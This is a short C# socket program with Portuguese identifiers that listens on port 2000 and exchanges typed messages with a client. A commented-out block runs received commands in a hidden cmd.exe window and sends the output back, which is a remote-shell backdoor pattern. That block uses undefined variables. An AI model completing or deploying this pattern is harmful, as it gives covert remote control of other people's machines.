using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;

namespace Cliente
{
    class Program
    {
        public static NetworkStream socket_cliente;
        public static void Receber_comando()
        {
            try
            {
                byte[] RecPacket = new byte[10000];
                socket_cliente.Read(RecPacket, 0, RecPacket.Length);
                socket_cliente.Flush();
                string tamanho_bytes = Encoding.Default.GetString(RecPacket);
                int tamanho = Convert.ToInt16(tamanho_bytes);
                Console.WriteLine("len: " + tamanho);

                byte[] r_comando = new byte[tamanho];
                socket_cliente.Read(r_comando, 0, r_comando.Length);
                socket_cliente.Flush();
                string Command = Encoding.Default.GetString(r_comando);
                Console.WriteLine(Command);
                socket_cliente.Flush();

                /*
                 
                // execute command
                Process p = new Process();
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/C " + command;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();

                // sending command output
                byte[] outputbuf = Encoding.Default.GetBytes(output);
                byte[] errorbuf = Encoding.Default.GetBytes(error);
                sck.Send(outputbuf, 0, outputbuf.Length, 0);
                sck.Send(errorbuf, 0, errorbuf.Length, 0);

                */

            }
            catch
            {

                Console.WriteLine("Desconectado!");
                Console.ReadKey();
                socket_cliente.Close();
            }

        }

        //
        static void Main(string[] args)
        {
            TcpListener listar = new TcpListener(2000);
            listar.Start();
            TcpClient conexao = listar.AcceptTcpClient();
            socket_cliente = conexao.GetStream();
            while (true)
            {
                Console.Write("digite uma msg:");
                string comando = Console.ReadLine();
                byte[] conteudo = Encoding.ASCII.GetBytes(comando);
                socket_cliente.Write(conteudo, 0, conteudo.Length);
                socket_cliente.Flush();
                Receber_comando();
            }
        }
    }
}
